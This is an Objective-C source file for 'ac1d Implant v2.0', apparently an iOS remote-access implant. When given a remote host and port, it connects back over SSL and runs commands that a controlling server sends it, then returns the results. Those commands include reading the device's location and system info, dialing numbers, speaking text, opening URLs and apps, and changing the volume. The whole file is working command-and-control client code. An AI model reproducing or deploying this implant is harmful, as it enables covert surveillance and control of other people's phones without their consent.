//
// MIT License
//
// Copyright (c) 2020 Ivan Nikolsky
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
//

#import "ac1d.h"

NSArray *commands = [[NSArray alloc] initWithObjects: @"alert", @"battery", @"dial", @"dhome", @"getvol", @"home", @"location", @"player", @"say", @"setvol", @"state", @"sysinfo", @"openurl", @"openapp", nil];

int sockfd, newsockfd;
SSL_CTX *ssl_client_ctx;
SSL *client_ssl;
struct sockaddr_in serverAddress;

void connectToServer(NSString *remote_host, int remote_port);
void showHelpMessage();
void showVersionMessage();

int main(int argc, const char *argv[]) {
    @autoreleasepool {
        ac1d *ac1d_base = [[ac1d alloc] init];
        if (argc < 2) showHelpMessage();
        else {
            NSMutableArray *args = [NSMutableArray array];
            for (int i = 0; i < argc; i++) {
                NSString *str = [[NSString alloc] initWithCString:argv[i] encoding:NSUTF8StringEncoding];
                [args addObject:str];
            }
            if ([args[1] isEqualToString:@"-h"] || [args[1] isEqualToString:@"--help"]) showHelpMessage(); 
            else if ([args[1] isEqualToString:@"-v"] || [args[1] isEqualToString:@"--version"]) showVersionMessage();
            else if ([args[1] isEqualToString:@"-r"] || [args[1] isEqualToString:@"--remote"]) {
                if (argc < 4) showHelpMessage();
                else {
                    connectToServer(args[2], [args[3] integerValue]);
                }
            } else if ([args[1] isEqualToString:@"-l"] || [args[1] isEqualToString:@"--local"]) {
                NSMutableArray *command_args = [NSMutableArray array];
                for (int i = 2; i < [args count]; i++) {
                    [command_args addObject:args[i]];
                }
                if ([commands containsObject:args[2]]) {
                    NSString *result = [ac1d_base sendCommand:command_args];
                    printf("%s", [result UTF8String]);
                } else {
                    showHelpMessage();
                }
            } else showHelpMessage();
        }
    }
    return 0;
}

void sendString(NSString *string) {
    SSL_write(client_ssl, [string UTF8String], (int)string.length);
}

void interactWithServer(NSString *remoteHost, int remotePort) {
    printf("[+] Interactive connection spawned!\n");
    ac1d *ac1d_base = [[ac1d alloc] init];
    ac1d_base->client_ssl = client_ssl;
    
    char buffer[2048] = "";
    while (SSL_read(client_ssl, buffer, sizeof(buffer))) {
        NSMutableArray *args = [NSMutableArray arrayWithArray:[[NSString stringWithUTF8String:buffer] componentsSeparatedByString:@" "]];
        char *terminator = (char*)[args[0] UTF8String];
        printf("[+] Got command from %s:%d!\n", [remoteHost UTF8String], remotePort);
        printf("[i] Current client terminator: %s\n", terminator);
        printf("[*] Executing %s...\n", [args[1] UTF8String]);
        if ([commands containsObject:args[1]]) {
            NSMutableArray *command_args = [NSMutableArray array];
            for (int i = 1; i < [args count]; i++) {
                [command_args addObject:args[i]];
            }
            NSString *result = [ac1d_base sendCommand:command_args];
            if (!result) printf("[-] Failed to execute command, cannot find ac1d.dylib!\n");
            sendString(result);
            SSL_write(client_ssl, terminator, (int)strlen(terminator));
        } else {
            printf("[-] Unrecognized command!\n");
            sendString(@"error");
            SSL_write(client_ssl, terminator, (int)strlen(terminator));
        }
        memset(buffer, '\0', 2048);
    }
}

void connectToServer(NSString *remoteHost, int remotePort) {
    printf("[i] ac1d Implant v2.0\n");
    printf("[i] Copyright (c) 2020 Ivan Nikolsky\n");
    printf("[*] Loading ac1d SSL handler...\n");
    SSL_load_error_strings();
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    ssl_client_ctx = SSL_CTX_new(SSLv23_client_method());
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    serverAddress.sin_family = AF_INET;
    inet_aton([remoteHost UTF8String], &serverAddress.sin_addr);
    serverAddress.sin_port = htons(remotePort);
    printf("[+] ac1d SSL handler loaded!\n");
    printf("[*] Connecting to %s:%d...\n", [remoteHost UTF8String], remotePort);
    if (connect(sockfd, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) < 0) {
        printf("[-] Failed to connect!\n");
        return;
    } else printf("[+] Successfully connected!\n");
    client_ssl = SSL_new(ssl_client_ctx);
    if(!client_ssl) {
        printf("[-] Failed to get SSL client!\n");
        return;
    }
    SSL_set_fd(client_ssl, sockfd);
    if(SSL_connect(client_ssl) != 1) {
        printf("[-] Failed to handshake with SSL client!\n");
        return;
    }
    printf("[*] Spawning interactive connection...\n");
    interactWithServer(remoteHost, remotePort);
    printf("[-] Connection closed!\n");
}

void showHelpMessage() {
    printf("Usage: ac1d <option> [arguments]\n");
    printf("\n");
    printf("  -h, --help                                Show available options.\n");
    printf("  -v, --version                             Show ac1d version.\n");
    printf("  -l, --local <option> [arguments]          Execute ac1d command locally.\n");
    printf("  -r, --remote <remote_host> <remote_port>  Execute ac1d commands over TCP.\n");
}

void showVersionMessage() {
    printf("ac1d Implant v2.0\n");
    printf("\n");
    printf("Copyright (c) 2020 Ivan Nikolsky\n");
}
